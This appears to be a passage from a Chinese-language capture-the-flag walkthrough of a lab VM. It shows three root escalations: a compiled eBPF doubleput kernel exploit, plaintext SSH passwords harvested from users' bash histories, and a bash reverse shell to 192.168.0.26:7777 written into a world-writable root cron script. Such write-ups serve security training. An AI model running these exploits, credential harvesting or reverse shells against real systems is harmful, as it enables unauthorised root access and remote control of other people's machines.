ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
$ cd ebpf_mapfd_doubleput_exploit
$ chmod +x compile.sh
$ ./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
$ ls
compile.sh
doubleput
doubleput.c
hello
hello.c
suidhelper
suidhelper.c
$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...

cd /root
ls
fix-wordpress.sh
flag.txt
issue
python.sh
wordpress.sql
cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

```

第二种提权方式，查看各个用户命令历史

```
$ cd /home
$ ls
AParnell
CCeaser
CJoo
DSwanger
Drew
ETollefson
Eeth
IChadwick
JBare
JKanode
JLipps
LSolum
LSolum2
MBassin
MFrei
NATHAN
RNunemaker
SHAY
SHayslett
SStroud
Sam
Taylor
elly
jamie
jess
kai
mel
peter
www
zoe
$ cat */.bash_history
exit
free
exit
exit
exit
exit
exit
exit
exit
exit
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
exit
exit
exit
exit
whoami
exit
exit
exit
exit
exit
exit
exit
exit
exit
id
exit
top
ps aux
exit
exit
exit
exit
cat: peter/.bash_history: Permission denied
top
exit

```

找到两个SSH用户

```
peter   : JZQuyIN5
JKanode : thisimypassword
```

使用peter用户进行登录，直接su root即可。

```
┌──(root💀kali)-[/opt]
└─# ssh peter@192.168.0.25                                                               
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@192.168.0.25's password: 
Welcome back!
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses --- 

red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
red% sudo su root 
➜  peter whoami  
root

```

第三种提权方法

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cat /etc/cron*

www-data@red:/var/www/https/blogblog/wp-content/uploads$ cd /etc
www-data@red:/etc$ ls -lah cron*
ls -lah cron*
-rw-r--r-- 1 root root  722 Apr  5  2016 crontab
cron.d:
total 32K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K May 15 17:54 ..
-rw-r--r--   1 root root  102 Jun  3  2016 .placeholder
-rw-r--r--   1 root root   56 Jun  3  2016 logrotate
-rw-r--r--   1 root root  589 Jul 16  2014 mdadm
-rw-r--r--   1 root root  670 Mar  1  2016 php
cron.daily:
total 56K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K May 15 17:54 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x   1 root root  376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  920 Apr  5  2016 apt-compat
-rwxr-xr-x   1 root root 1.6K Nov 26  2015 dpkg
-rwxr-xr-x   1 root root  372 May  6  2015 logrotate
-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x   1 root root  383 Mar  8  2016 samba
-rwxr-xr-x   1 root root  214 Apr 12  2016 update-notifier-common
cron.hourly:
total 20K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K May 15 17:54 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
cron.monthly:
total 20K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K May 15 17:54 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
cron.weekly:
total 28K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K May 15 17:54 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root  211 Apr 12  2016 update-notifier-common
www-data@red:/etc$
www-data@red:/etc$ cat cron.d/logrotate
cat cron.d/logrotate
*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
www-data@red:/etc$ ls -la /usr/local/sbin/cron-logrotate.sh
ls -la /usr/local/sbin/cron-logrotate.sh
-rwxrwxrwx 1 root root 130 May 15 19:09 /usr/local/sbin/cron-logrotate.sh
www-data@red:/etc$ cat /usr/local/sbin/cron-logrotate.sh
cat /usr/local/sbin/cron-logrotate.sh
#Simon, you really need to-do something about this
www-data@red:/etc$
```

写入定时计划反弹shell

```
www-data@red:/$ echo "bash -i >& /dev/tcp/192.168.0.26/7777 0>&1 " >/usr/local/sbin/cron-logrotate.sh

www-data@red:/$ cat /usr/local/sbin/cron-logrotate.sh
bash -i >& /dev/tcp/192.168.0.26/7777 0>&1 
```



